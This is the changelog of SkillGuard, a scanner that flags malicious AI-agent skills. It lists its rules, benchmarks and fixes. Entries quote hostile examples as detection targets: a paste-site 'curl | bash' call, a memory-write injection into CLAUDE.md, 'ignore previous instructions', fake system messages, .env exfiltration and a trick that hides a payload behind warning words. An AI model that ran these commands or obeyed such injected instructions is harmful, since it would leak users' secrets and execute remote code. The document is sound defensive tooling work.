# Changelog

## 2.4.0 (2026-10-02)

- **Shipped a benchmark.** `bench/run.py` measures detection and false alarms
  against 35 labelled fixtures, with third-party corpora fetched at pinned
  commits (`--corpus`). It exits 1 on a regression, so CI now fails when an
  attack is missed or an ordinary skill is flagged. Current: **23/23 attacks
  caught, 0/9 ordinary skills flagged, 0/34 real third-party skills flagged.**
- **Fixed: a payload in a helper script only counted as a capability.** A skill
  whose `.py` file ran `os.system("curl https://glot.io/... | bash")` came out
  **Medium**, because "Shell Execution" is a capability that caps at 30 points
  and nothing looked at what the string contained. New `payload` sweep reads
  string literals in code files for paste-site hosts, remote pipe-to-shell,
  decode-and-run and bare-IP URLs, and reports them as threats. That skill is
  now Critical.
- **Fixed: one High finding read as Medium.** Severity weights sat below their
  own band floors (high was 30 points, the High band starts at 51), so a single
  High threat landed in Medium. Weights are now 76/51/20/0, at the floor of each
  band.
- **Fixed: false positive on any object with a `role` key.** The "System Prompt
  Construction" rule matched `{ role: 'column' }` in ordinary data objects
  (tldraw calls), reporting High prompt injection. It now requires a real chat
  role value (`system`, `user`, `assistant`, `tool`, `model`, `developer`) or a
  `system`/`systemPrompt` key.
- Added `docs/jev-spike.md`: measurements for the local classifier that was tried
  on the context-dependent cases. Its verdict was "second opinion, raise-only".
- Tests 81 (was 72). Benchmark fixtures and `bench/README.md` shipped with the
  repo; **no third-party skill content is vendored** (`anthropics/skills` has no
  licence, so corpora are fetched at run time).

## 2.2.1 (2026-10-02)

- **Security fix: a warning could launder an attack.** 2.2.0 lowered any finding
  that sat near a word like "never" or "do not". A skill could therefore put
  "documentation only, the agent should never run this" above a payload and drop
  from CRITICAL to Safe. Measured on a new disguised-attack set: 4 of 8 got
  through. Now:
  - Only the 7 rules whose meaning depends on context may be softened
    (`pipe-to-shell`, `shell-from-download`, `download-then-execute`,
    `credential-file-access`, `keychain-dump`, `remove-quarantine`,
    `skip-agent-permissions`).
  - A warning followed by an order ("never ... the agent must now run") no
    longer counts as a warning.
  - Softening lands on **Medium**, never on Safe, and could never fail-open.
  - Hard evidence (paste-site hosts, decode-and-run, exfiltration, hiding things
    from the user, memory writes) is never softened at all.
- New rule: `memory-trust-injection` (CRITICAL) - writes a standing order into
  the agent's memory or instruction files (`echo "always trust ..." >> CLAUDE.md`).
- New rule: `prose-exfiltration` (CRITICAL) - tells the agent in plain words to
  send a credential or `.env` file to a web address.
- New disguised-attack test set: 8 attacks dressed as documentation, all caught.
  Tests: 72/72.

## 2.2.0 (2026-10-02)

- Scoring now separates **capabilities** from **threats**. Running a command,
  writing a file or calling an API is what honest tools do; those findings cap
  at 30 points between them. Credential theft, exfiltration, prompt injection,
  hidden instructions and downloaded-and-run payloads count in full.
- Points come from severity alone (critical 50, high 30, medium 20, low 0).
  Category weights are gone, so how a rule is written decides its weight. Set
  `severityWeights.low` to 10 for the old behaviour.
- Low findings are informational: they stay in the report and no longer move
  the score.
- Every category not on the capability list counts as a threat, so a new rule
  is never quietly harmless. One critical threat lifts the total to the `high`
  threshold, so a critical finding can never come out medium or safe.
- Fixed: `pdf`, `docx`, `xlsx`, `pptx`, `skill-creator` and other honest skills
  used to score CRITICAL for ordinary file writes. On 34 trusted skills the
  results went from 9 CRITICAL to 0 High/Critical (26 Safe, 8 Medium).
- Fixed false alarms that wrongly reported CRITICAL: `eval(` inside a string
  (`print("eval(s) failed")`), `api_key = "auth-key"` placeholders, `ENV_API_KEY`
  variable names, and `curl | bash` shown in a warning about `curl | bash`.
- Fixed: `pipe-to-shell` is HIGH, not MEDIUM. A paste-site `curl … | bash` now
  scores 60 and fails the scan, instead of passing at 50.
- New: `src/__tests__/scoring.test.ts` pins the scoring rules (12 cases).
- Docs: README and CONFIGURATION.md describe the capability/threat model and
  the measured examples (five file writes = Safe 0, one `eval()` = High 51,
  `eval()` + `exec()` = Critical 80).

## 2.1.0 (2026-10-02)

- New: SkillGuard now reads `SKILL.md` and other markdown files, the
  instructions an agent actually follows. 28 rules cover the techniques seen in
  real malicious skills (ClawHavoc, Jan 2026; Snyk ToxicSkills, Feb 2026):
  fake "prerequisite" installers, `curl | bash` from paste sites, raw-IP
  payload servers, password-protected archives, base64 decode-and-run, secret
  exfiltration, keychain dumps, "ignore previous instructions", fake system
  messages, telling the agent to hide things from you, Gatekeeper/quarantine
  bypass, writes to agent memory files (`MEMORY.md`, `SOUL.md`, `CLAUDE.md`),
  hidden HTML comments, and invisible Unicode (tag smuggling, zero-width, bidi).
- Injection in the frontmatter `description` is always CRITICAL, because the
  agent loads it in every session.
- Quoted attack phrases ("avoid saying 'ignore previous instructions'") are
  reported as LOW, not as attacks. Chat-template tokens inside code blocks are
  ignored. Detected secrets are redacted in the report.
- Tested on 34 trusted skills (Anthropic, obra/superpowers): 33 have zero
  instruction findings. 28 attack cases and 16 benign look-alikes are in the
  test suite.

## 2.0.9 (2026-10-02)

- Fixed: TypeScript files with type annotations were silently skipped. A file
  with `const cmd: string = ...` returned zero findings. TS now goes through a
  real TypeScript parser, and casts like `(exec as any)(cmd)` are seen through.
- Fixed: the dependency check ran `npm install` inside the folder you scanned,
  leaving a new `package-lock.json` behind and reading that folder's `.npmrc`.
  It now works in a private temp copy and leaves your folder untouched.
- Fixed: the logo banner still said v1.0.0, and the "Risk Level" box border was
  misaligned.
- Now needs Node.js 20.19 or newer.
- Docs: README rewritten and fact-checked against the code, with a scan
  screenshot and a how-it-works infographic.

## 2.0.8 (2026-10-02)

- Fixed: `skillguard version` printed v1.0.0. It now shows the real version.
- Docs: accurate claims, a working CI example, an up-to-date project tree.

## 2.0.7 (2026-10-02)

- Fixed: scanning a relative path like `../my-skill` hung forever
  (config lookup never reached the filesystem root).
- Fixed: `--version` and `skillguard version` now report the real version.
- Distribution moved off the npm registry. Install with Homebrew
  (`brew install heyytars/tap/skillguard`) or from GitHub Releases.
- Project moved to `github.com/heyytars/skillguard`.

## 2.0.0 (2026-02-04)

- Multi-language analyzers (JS/TS, Python, Java, Go, Ruby, PHP, C/C++, Rust),
  threat categories, configurable scoring. Last version published to npm.
